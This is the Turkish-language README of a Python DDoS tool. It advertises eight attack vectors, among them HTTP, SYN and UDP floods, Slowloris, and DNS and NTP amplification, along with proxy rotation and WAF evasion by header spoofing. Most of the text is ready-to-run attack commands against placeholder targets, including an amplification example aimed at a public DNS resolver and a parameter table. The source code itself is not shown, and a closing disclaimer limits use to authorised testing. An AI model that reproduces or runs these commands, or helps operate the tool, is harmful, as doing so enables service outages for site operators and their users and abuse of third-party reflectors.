# Multi-Vector DDoS Tool v2.0

Güçlü, çoklu vektör destekli, cross-platform DDoS aracı. Python 3 ile yazılmıştır.

## Ozellikler

- **8 Saldiri Vektoru**: HTTP/HTTPS Flood, Slowloris, UDP Flood, DNS Amplification, SSL/TLS Flood, SYN Flood, HTTP/2 Flood, NTP Amplification
- **Karma Saldiri**: Tum vektorleri ayni anda calistirma
- **Cross-Platform**: Linux, Windows, macOS
- **Proxy Rotasyonu**: Otomatik proxy toplama ve dogrulama
- **WAF Atlatma**: Random User-Agent, X-Forwarded-For, referer spoofing
- **Istatistik**: Anlik RPS, basari/basarisiz orani, hata analizi
- **Otomatik Bagimlilik Yonetime**: Eksik kutuphaneleri otomatik kurar

## Kurulum

```bash
git clone https://github.com/kullanici/ddos-tool.git
cd ddos-tool
python ddos.py --about
```

## Kullanim

```bash
# HTTP Flood - en guclu vektor
python ddos.py -t http://hedef-site.com -m http -p 500 -d 60

# HTTPS ile
python ddos.py -t https://hedef-site.com -m http -p 1000

# Slowloris - baglanti tuketme
python ddos.py -t http://hedef-site.com -m slowloris -p 200

# UDP Flood
python ddos.py -t 192.168.1.100:80 -m udp -p 100

# DNS Amplification (port 53)
python ddos.py -t 8.8.8.8:53 -m dns -p 50

# SSL/TLS Flood (port 443)
python ddos.py -t hedef-site.com:443 -m ssl -p 300

# SYN Flood (root/admin gerekli)
sudo python ddos.py -t hedef-site.com -m syn -p 100

# HTTP/2 Flood
python ddos.py -t https://hedef-site.com -m http2 -p 200

# NTP Amplification (port 123)
python ddos.py -t 10.0.0.1:123 -m ntp -p 50

# Karma Saldiri - tum vektorler
python ddos.py -t https://hedef-site.com -m mixed -p 200 -d 120

# Proxy rotasyonu ile
python ddos.py -t http://hedef-site.com -m http -p 500 --proxy

# Proxy dogrulama ile
python ddos.py -t http://hedef-site.com -m http --proxy --proxy-verify

# Kendi proxy listen ile
python ddos.py -t http://hedef-site.com -m http --proxy --proxy-file proxy.txt

# Modlari listele
python ddos.py --list-modes
```

## Parametreler

| Parametre | Kisaltma | Aciklama |
|-----------|----------|----------|
| `--target` | `-t` | Hedef URL veya ip:port |
| `--mode` | `-m` | Saldiri modu (default: http) |
| `--threads` | `-p` | Thread sayisi (default: 100) |
| `--duration` | `-d` | Sure saniye (0=sonsuz, default:0) |
| `--proxy` | | Proxy rotasyonu aktif |
| `--proxy-file` | | Proxy listesi dosyasi |
| `--proxy-verify` | | Proxy'leri dogrula |
| `--list-modes` | | Modlari listele |
| `--about` | | Arac hakkinda |

## Saldiri Modlari

| Mod | Aciklama |
|-----|----------|
| http | HTTP/HTTPS Flood - en guclu vektor |
| slowloris | Slowloris - baglanti tuketme |
| udp | UDP Flood - Layer 4 saldirisi |
| dns | DNS Amplification - refleksiyon saldirisi |
| ssl | SSL/TLS Handshake Flood |
| syn | SYN Flood - root/admin gerekli |
| http2 | HTTP/2 Flood |
| ntp | NTP Amplification - refleksiyon |
| mixed | Karma - tum vektorler ayni anda |

## Gereksinimler

- Python 3.8+
- PySocks (proxy icin)
- Root/Admin (SYN flood icin)

## Lisans

Bu araç yalnizca egitim ve guvenlik testleri icindir. Yetkisiz kullanim yasaktir.

## Uyari

Bu aracin kullanimi yasal sorumluluk dogurur. Yalnizca size ait sistemlerde veya
yazili izniniz olan sistemlerde kullanin. Kotu amacli kullanimdan gelistirici
sorumlu degildir.
